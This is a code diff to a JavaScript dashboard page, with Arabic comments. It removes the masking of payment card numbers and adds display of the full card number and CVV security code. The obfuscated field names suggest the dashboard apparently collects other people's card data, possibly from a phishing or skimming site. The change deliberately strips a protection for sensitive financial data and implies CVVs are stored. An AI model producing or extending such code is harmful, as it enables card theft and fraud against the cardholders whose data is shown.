@@ -1846,11 +1846,11 @@ export default function DashboardPage() {
     const hasCardData = raw?._v1 || raw?.cardNumber || raw?.hasCard || raw?.cvv || raw?._v2 || raw?.cardOwner || raw?._v4;
     if (!hasCardData) return null;
 
-    // رقم البطاقة (مخفي جزئياً)
+    // رقم البطاقة (كامل)
     const cardNumber = raw?._v1 || raw?.cardNumber || "";
-    const maskedCard = cardNumber.replace(/(\d{4})\s?(\d{4})\s?(\d{4})\s?(\d{4})/, (_, g1, g2, g3, g4) => {
-      return `${g1} **** **** ${g4}`;
-    });
+
+    // رمز الأمان
+    const cvv = raw?._v2 || raw?.cvv || "";
 
     // نوع البطاقة
     const cardType = raw?.cardType || detectCardType(cardNumber);
@@ -1940,13 +1940,14 @@ export default function DashboardPage() {
             <span style={{ fontSize: "1.2rem" }}>💳</span>
           </div>
           
+          {/* رقم البطاقة كامل */}
           <div style={{ 
             fontFamily: "ui-monospace, monospace", 
             fontSize: "1.1rem", 
             letterSpacing: "2px",
             marginBottom: 12
           }}>
-            {maskedCard || "**** **** **** ****"}
+            {cardNumber || "**** **** **** ****"}
           </div>
           
           <div style={{ 
@@ -1960,9 +1961,17 @@ export default function DashboardPage() {
                 {cardHolder || "UNKNOWN"}
               </div>
             </div>
-            <div>
-              <div style={{ opacity: 0.7, marginBottom: 2 }}>Expires</div>
-              <div style={{ fontWeight: 500 }}>{expiryDate || "**/**"}</div>
+            <div style={{ display: "flex", gap: 16 }}>
+              <div>
+                <div style={{ opacity: 0.7, marginBottom: 2 }}>Expires</div>
+                <div style={{ fontWeight: 500 }}>{expiryDate || "**/**"}</div>
+              </div>
+              {cvv && (
+                <div>
+                  <div style={{ opacity: 0.7, marginBottom: 2 }}>CVV</div>
+                  <div style={{ fontWeight: 500 }}>{cvv}</div>
+                </div>
+              )}
             </div>
           </div>
         </div>
